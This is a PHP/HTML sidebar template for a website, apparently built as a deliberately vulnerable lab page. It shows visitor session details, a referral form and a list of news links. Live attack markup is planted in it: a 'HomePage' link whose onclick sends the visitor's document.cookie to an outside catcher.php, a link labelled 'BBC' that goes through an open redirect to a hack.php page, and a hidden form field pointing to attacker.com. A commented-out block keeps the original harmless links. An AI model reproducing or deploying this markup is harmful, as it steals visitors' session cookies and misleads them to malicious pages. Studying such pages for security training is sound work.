<div id="sidebar">

<div class="sidebar-element">
<h3> Visitor Session Details </h3>
<?php
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'];
if ($referred == "") {
$referrer = "This page was accessed directly";
 }


   $_SESSION['userName'] = $ip.$browser;
   if( isset( $_SESSION['counter'] ) ) {
      $_SESSION['counter'] += 1;
   }else {
      $_SESSION['counter'] = 1;
   }
	
   $msg = "You have visited this page ".  $_SESSION['counter'];
   $msg .= "in this session.";
?>
 <?php echo "Your session is running " . $_SESSION['userName']; ?> 
  <br>
   <?php  echo ( $msg ); ?>
</div>
 


<div class="sidebar-element">
<h3>Website Referral</h3>
 <form action="referral.php" method="POST">
Enter any website you want to visit: <input type="text" name="someUserInput"><br>
<input type="hidden" name="redirect" value="http://www.attacker.com" target="_blank" ><br>
<input type="submit" name="Submit">
</form>
</div>


<div class="sidebar-element">
<h3>Link to other websites</h3>
   <ul>
  
 <li><a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">HomePage </a> </li>



 <li><a href="http://www.nytimes.com/" target="_blank" >NYTimes </a></li>
  <li><a href="http://theplanetreports.com/redirect.php?url=http://theplanetreports.com/hack.php" target="_blank" >BBC </a></li>
  <li><a href="http://www.espncricinfo.com/" target="_blank" >Cricinfo </a></li>
  <li><a href="http://www.mashable.com/" target="_blank" >Mashable</a></li>
  </ul>
</div>
<!--
<div class="sidebar-element">
<h3>Link to other websites</h3>
   <ul>
  <li><a href="http://www.nytimes.com/"target="_blank" >NYTimes </a></li>
  <li><a href="http://www.bbcnews.com/"target="_blank" >BBC </a></li>
  <li><a href="http://www.espncricinfo.com/"target="_blank" >Cricinfo </a></li>
  <li><a href="http://www.mashable.com/"target="_blank" >Mashable</a></li>
  </ul>
</div>
--> 
</div> <!--sidebar-->
